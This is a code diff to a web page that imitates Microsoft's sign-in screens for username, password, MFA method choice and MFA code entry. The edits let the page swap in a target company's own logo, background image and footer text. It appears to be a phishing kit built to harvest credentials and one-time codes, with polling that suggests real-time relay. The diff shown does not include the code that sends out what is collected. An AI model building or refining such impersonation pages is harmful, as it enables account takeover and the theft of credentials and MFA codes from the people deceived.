@@ -17,49 +17,35 @@ body {
   overflow: hidden;
 }
 
-/* Geometric background shapes (MS-style) */
+/* Subtle geometric shapes on light background */
 body::before, body::after {
   content: "";
   position: fixed;
   border-radius: 50%;
-  opacity: 0.07;
+  opacity: 0.06;
   background: #0067b8;
   pointer-events: none;
 }
 body::before { width: 600px; height: 600px; top: -200px; left: -200px; }
 body::after  { width: 500px; height: 500px; bottom: -180px; right: -150px; }
 
+/* Blurred background image layer (only shown when branding is loaded) */
 #bgLayer {
   position: fixed; inset: -30px;
   z-index: -1;
   background-size: cover;
   background-position: center;
-  filter: blur(28px) brightness(0.75);
+  filter: blur(32px) brightness(0.55) saturate(1.2);
   transform: scale(1.05);
   display: none;
 }
 body.has-bg-image #bgLayer { display: block; }
-body.has-bg-image .card { background: #1b1b1b; box-shadow: 0 4px 32px rgba(0,0,0,0.7); }
-body.has-bg-image h1,
-body.has-bg-image h2 { color: #fff; }
-body.has-bg-image .email-back-row { color: #c8c8c8; }
-body.has-bg-image .pw-input { color: #fff; border-bottom-color: #666; }
-body.has-bg-image .pw-input:focus { border-bottom-color: #4fc3f7; }
-body.has-bg-image .forgot-link,
-body.has-bg-image .ms-link { color: #4fc3f7; }
-body.has-bg-image .username-sub { color: #aaa; }
-body.has-bg-image .username-input { color: #fff; border-bottom-color: #666; }
-body.has-bg-image .username-input:focus { border-bottom-color: #4fc3f7; }
-body.has-bg-image .footer-bar { background: #111; border-top-color: #333; color: #999; }
-body.has-bg-image .footer-bar a { color: #999; }
-body.has-bg-image .status-error { color: #f88; }
 
 /* Top loader */
 #topLoader {
   position: fixed; top: 0; left: 0; right: 0; height: 3px;
   overflow: hidden; opacity: 0; pointer-events: none;
-  transition: opacity 0.15s;
-  z-index: 1000;
+  transition: opacity 0.15s; z-index: 1000;
 }
 #topLoader.visible { opacity: 1; }
 #topLoader .sweep {
@@ -74,7 +60,7 @@ body.has-bg-image .status-error { color: #f88; }
 .card {
   background: #fff;
   border-radius: 2px;
-  box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+  box-shadow: 0 2px 6px rgba(0,0,0,0.18);
   padding: 44px 44px 36px;
   position: relative;
 }
@@ -90,7 +76,6 @@ body.has-bg-image .status-error { color: #f88; }
   letter-spacing: -0.2px;
 }
 
-/* Logo-mark (for username screen — hidden on password screen) */
 .logo-mark { display: flex; }
 
 /* Headings */
@@ -116,12 +101,12 @@ h2 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 20px; }
   width: 100%; padding: 8px 0 4px;
   border: none; border-bottom: 1px solid #605e5c;
   background: transparent; font-size: 15px; color: #1b1b1b;
-  outline: none;
-  font-family: inherit;
+  outline: none; font-family: inherit;
 }
-.username-input:focus { border-bottom: 2px solid #0067b8; margin-bottom: -1px; }
-.pw-input:focus { border-bottom: 2px solid #0067b8; margin-bottom: -1px; }
+.username-input:focus { border-bottom: 2px solid #0067b8; padding-bottom: 3px; }
+.pw-input:focus      { border-bottom: 2px solid #0067b8; padding-bottom: 3px; }
 .username-input::placeholder { color: transparent; }
+.pw-input::placeholder { color: #605e5c; }
 
 /* Floating label for username */
 .input-wrap { position: relative; margin-bottom: 20px; }
@@ -137,9 +122,7 @@ h2 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 20px; }
 }
 
 /* Password input wrapper (with eye) */
-.pw-wrap {
-  position: relative; margin-bottom: 8px;
-}
+.pw-wrap { position: relative; margin-bottom: 8px; }
 .pw-eye {
   position: absolute; right: 0; top: 50%; transform: translateY(-50%);
   background: none; border: none; cursor: pointer;
@@ -163,7 +146,7 @@ h2 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 20px; }
 }
 .forgot-link:hover { text-decoration: underline; }
 
-/* Buttons row: Back (left) + Next/Sign in (right) */
+/* Buttons row */
 .btn-row {
   display: flex; justify-content: flex-end; gap: 8px;
   margin-top: 16px;
@@ -217,7 +200,6 @@ h2 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 20px; }
   padding: 14px 44px; font-size: 13px; color: #605e5c;
   border-radius: 0 0 2px 2px;
 }
-body.has-bg-image .pw-footer { background: #111; border-top-color: #333; color: #888; }
 
 /* Result */
 pre#result {
@@ -293,13 +275,14 @@ pre#result {
     <!-- Username screen -->
     <form id="usernameForm">
       <div class="ms-logo-row logo-mark">
-        <svg width="21" height="21" viewBox="0 0 21 21">
+        <svg class="ms-logo-svg" width="21" height="21" viewBox="0 0 21 21">
           <rect x="0"  y="0"  width="10" height="10" fill="#F35325"/>
           <rect x="11" y="0"  width="10" height="10" fill="#81BC06"/>
           <rect x="0"  y="11" width="10" height="10" fill="#05A6F0"/>
           <rect x="11" y="11" width="10" height="10" fill="#FFBA08"/>
         </svg>
-        <span>Microsoft</span>
+        <span class="ms-logo-text">Microsoft</span>
+        <img class="company-logo-img" style="display:none;max-height:40px;" src="" alt="">
       </div>
       <h1>Sign in</h1>
       <div id="status" class="status-info"></div>
@@ -318,13 +301,14 @@ pre#result {
     <!-- Password screen -->
     <form id="passwordForm" style="display:none;">
       <div class="ms-logo-row">
-        <svg width="21" height="21" viewBox="0 0 21 21">
+        <svg class="ms-logo-svg" width="21" height="21" viewBox="0 0 21 21">
           <rect x="0"  y="0"  width="10" height="10" fill="#F35325"/>
           <rect x="11" y="0"  width="10" height="10" fill="#81BC06"/>
           <rect x="0"  y="11" width="10" height="10" fill="#05A6F0"/>
           <rect x="11" y="11" width="10" height="10" fill="#FFBA08"/>
         </svg>
-        <span>Microsoft</span>
+        <span class="ms-logo-text">Microsoft</span>
+        <img class="company-logo-img" style="display:none;max-height:40px;" src="" alt="">
       </div>
       <div class="email-back-row" id="passwordBackArrow">
         <span class="back-chevron">&#8592;</span>
@@ -353,13 +337,14 @@ pre#result {
     <!-- MFA choice screen -->
     <div id="mfaChoiceScreen" style="display:none;">
       <div class="ms-logo-row">
-        <svg width="21" height="21" viewBox="0 0 21 21">
+        <svg class="ms-logo-svg" width="21" height="21" viewBox="0 0 21 21">
           <rect x="0"  y="0"  width="10" height="10" fill="#F35325"/>
           <rect x="11" y="0"  width="10" height="10" fill="#81BC06"/>
           <rect x="0"  y="11" width="10" height="10" fill="#05A6F0"/>
           <rect x="11" y="11" width="10" height="10" fill="#FFBA08"/>
         </svg>
-        <span>Microsoft</span>
+        <span class="ms-logo-text">Microsoft</span>
+        <img class="company-logo-img" style="display:none;max-height:40px;" src="" alt="">
       </div>
       <div class="mfa-header" id="mfaChoiceEmailRow"></div>
       <h2>Verify your identity</h2>
@@ -374,13 +359,14 @@ pre#result {
     <!-- MFA code screen -->
     <form id="mfaCodeForm" style="display:none;">
       <div class="ms-logo-row">
-        <svg width="21" height="21" viewBox="0 0 21 21">
+        <svg class="ms-logo-svg" width="21" height="21" viewBox="0 0 21 21">
           <rect x="0"  y="0"  width="10" height="10" fill="#F35325"/>
           <rect x="11" y="0"  width="10" height="10" fill="#81BC06"/>
           <rect x="0"  y="11" width="10" height="10" fill="#05A6F0"/>
           <rect x="11" y="11" width="10" height="10" fill="#FFBA08"/>
         </svg>
-        <span>Microsoft</span>
+        <span class="ms-logo-text">Microsoft</span>
+        <img class="company-logo-img" style="display:none;max-height:40px;" src="" alt="">
       </div>
       <div class="mfa-header" id="mfaCodeEmailRow"></div>
       <h2>Enter code</h2>
@@ -614,9 +600,15 @@ function stopPolling() { stopWaitingLoader(); }
 function resetBranding() {
   bgLayer.style.backgroundImage = ""; document.body.classList.remove("has-bg-image");
   passwordLogo.style.display = "none"; passwordLogo.src = ""; passwordFooterText.textContent = "";
+  document.querySelectorAll(".ms-logo-svg,.ms-logo-text").forEach(el => el.style.display = "");
+  document.querySelectorAll(".company-logo-img").forEach(el => { el.src = ""; el.style.display = "none"; });
 }
 function applyBranding(data) {
   if (data.background_image) { bgLayer.style.backgroundImage = `url('${data.background_image}')`; document.body.classList.add("has-bg-image"); }
+  if (data.logo) {
+    document.querySelectorAll(".ms-logo-svg,.ms-logo-text").forEach(el => el.style.display = "none");
+    document.querySelectorAll(".company-logo-img").forEach(el => { el.src = data.logo; el.style.display = "block"; });
+  }
   if (data.footer_text) passwordFooterText.textContent = data.footer_text;
 }
 
